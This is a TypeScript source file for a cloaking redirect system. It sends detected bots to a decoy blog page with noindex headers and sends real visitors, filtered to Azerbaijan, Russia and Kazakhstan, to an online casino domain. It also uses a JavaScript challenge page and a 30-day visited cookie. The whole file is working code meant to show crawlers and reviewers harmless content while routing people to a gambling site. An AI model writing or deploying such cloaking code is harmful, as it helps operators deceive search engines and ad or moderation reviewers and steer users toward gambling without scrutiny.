export interface RedirectConfig {
  url: string;
  status: 301 | 302 | 303 | 307 | 308;
  headers?: Record<string, string>;
  description: string;
}

export interface CloakingConfig {
  botRedirect: string;
  realUserRedirect: string;
  jsChallengeUrl: string;
  allowedCountries: string[];
  cookieName: string;
  cookieMaxAge: number;
  cacheControl: string;
}

export const DEFAULT_CLOAKING_CONFIG: CloakingConfig = {
  botRedirect: 'https://www.gamixlabs.com/blog.html',
  realUserRedirect: 'https://galaxy-casino.live',
  jsChallengeUrl: '/js-challenge.html',
  allowedCountries: ['AZ', 'RU', 'KZ'],
  cookieName: 'galaxy_visited',
  cookieMaxAge: 60 * 60 * 24 * 30,
  cacheControl: 'no-cache, no-store, must-revalidate'
};

export function getBotRedirectConfig(botType?: string): RedirectConfig {
  return {
    url: DEFAULT_CLOAKING_CONFIG.botRedirect,
    status: 301,
    headers: {
      'Cache-Control': DEFAULT_CLOAKING_CONFIG.cacheControl,
      'X-Robots-Tag': 'noindex, nofollow',
      'X-Bot-Type': botType || 'unknown'
    },
    description: 'Bot redirect'
  };
}

export function getRealUserRedirectConfig(): RedirectConfig {
  return {
    url: DEFAULT_CLOAKING_CONFIG.realUserRedirect,
    status: 302,
    headers: {
      'Cache-Control': DEFAULT_CLOAKING_CONFIG.cacheControl,
      'X-User-Type': 'real'
    },
    description: 'Real user redirect to main site'
  };
}

export function getJSChallengeConfig(): Omit<RedirectConfig, 'status'> & { status: 200 } {
  return {
    url: DEFAULT_CLOAKING_CONFIG.jsChallengeUrl,
    status: 200,
    headers: {
      'Cache-Control': 'no-cache, no-store, must-revalidate',
      'X-Challenge-Type': 'javascript',
      'Content-Type': 'text/html'
    },
    description: 'JavaScript challenge page'
  };
}

export function createRedirectResponse(config: RedirectConfig): Response {
  return new Response(null, { status: config.status, headers: { Location: config.url, ...config.headers } });
}

export function hasVisitedCookie(request: Request, cookieName: string = DEFAULT_CLOAKING_CONFIG.cookieName): boolean {
  const cookie = request.headers.get('cookie');
  if (!cookie) return false;
  return cookie.split(';').map(c => c.trim()).some(c => c.startsWith(`${cookieName}=`));
}

export function setVisitedCookie(response: Response, cookieName: string = DEFAULT_CLOAKING_CONFIG.cookieName): void {
  const cookieValue = `${cookieName}=true; Path=/; Max-Age=${DEFAULT_CLOAKING_CONFIG.cookieMaxAge}; HttpOnly; Secure; SameSite=Lax`;
  response.headers.set('Set-Cookie', cookieValue);
}


